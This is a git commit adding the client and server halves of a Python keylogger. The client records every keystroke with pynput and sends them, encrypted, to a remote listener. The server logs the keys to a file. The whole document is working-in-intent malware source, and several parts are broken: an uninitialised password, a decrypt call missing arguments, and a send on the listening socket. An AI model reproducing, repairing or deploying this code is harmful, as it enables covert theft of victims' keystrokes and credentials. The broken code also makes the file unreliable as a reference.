414339807db1032f791864469bfbf915b988c968
Monica Hanson <wolfmurdurer23@gmail.com>
2022-09-28 23:22:09 -0500

    First major implementation

---
+++ client.py
@@ -0,0 +1,57 @@
+#!/usr/bin/env python3
+
+import socket
+from pynput.keyboard import Listener
+import os
+import sys
+import time
+from pyaes256 import PyAES256
+
+def connect(address, port=13579):
+    global enc
+    global srv
+    global password
+
+    # Connect and send hostname
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.connect((address, port))
+    srv.send(f'{socket.gethostname()}\n'.encode('utf-8'))
+
+    # Set up encryption scheme
+    enc = PyAES256()
+    while not password:
+        password = srv.recv().decode('utf-8')
+
+    return password
+
+def ship(sequence):
+    srv.send(enc.encrypt(sequence, password).encode('utf-8'))
+  
+def on_press(key):
+    chars = []
+
+    try:
+        ship(str(key.char))
+    except AttributeError:
+        ship(f'[{key}]')
+
+def daemon():
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
+def main(addr):
+    try: 
+        connect(addr)
+    except ConnectionRefusedError:
+        print("Couldn't connect to the server, trying again in 5 seconds...")
+        time.sleep(5)
+        main()
+
+    try:
+        daemon()
+    except ConnectionResetError: 
+        exit()
+
+if __name__ == "__main__":
+    addr = sys.argv[1]
+    main(addr)
---
+++ server.py
@@ -0,0 +1,69 @@
+#!/usr/bin/env python3
+
+import socket
+import sys
+import hashlib
+from pyaes256 import PyAES256
+
+def passwd(client, server):
+    global enc
+    global hashed
+    enc = pyaes256()
+    password = ""
+
+    # Generate the password for the AES encryption
+    for letter in server:
+        password = password + str(ord(letter))
+    password = password + "-_-"
+    for letter in client:
+        password = password + letter
+
+    # Hash it with SHA512
+    # Note: Still not convinced bogosorting could help bullshit it
+    hashed = hashlib.sha512(password.encode("utf-8")).hexdigest()
+    return hashed
+
+def decrypt(sequence):
+    enc.decrypt(sequence, )
+
+def log(sequence):
+    print(''.join(sequence))
+    with open('output.log', 'a') as pressedKeys:
+        pressedKeys.write('\n'.join(sequence))
+
+def begin(address, port=13579):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
+        srv.bind((address, port))
+        srv.listen()
+        print(f"Waiting for a connection on {address}:{port}...")
+        conn, addr = srv.accept()
+        print(f"Connection from {addr}")
+        client = conn.recv(2048).decode('utf-8')
+
+        password = passwd(client, socket.gethostname())
+        print(client)
+        srv.send(password.encode('utf-8'))
+
+        return conn
+
+def main(srv):
+    loggedKeys = []
+    while True:
+        recv = srv.recv(2048).decode('utf-8')
+
+        if recv:
+            data = decrypt(recv, password)
+            loggedKeys.append(data)
+
+            if loggedKeys[-1] == '[Key.enter]' or loggedKeys[-1] == '[Key.tab]' or loggedKeys[-1] == '[Key.space]':
+                log(loggedKeys)
+                loggedKeys = []
+
+if __name__ == "__main__":
+    server = begin('0.0.0.0')
+    try:
+        main(server)
+    except KeyboardInterrupt:
+        print("Exiting...")
+        server.close()
+        sys.exit()
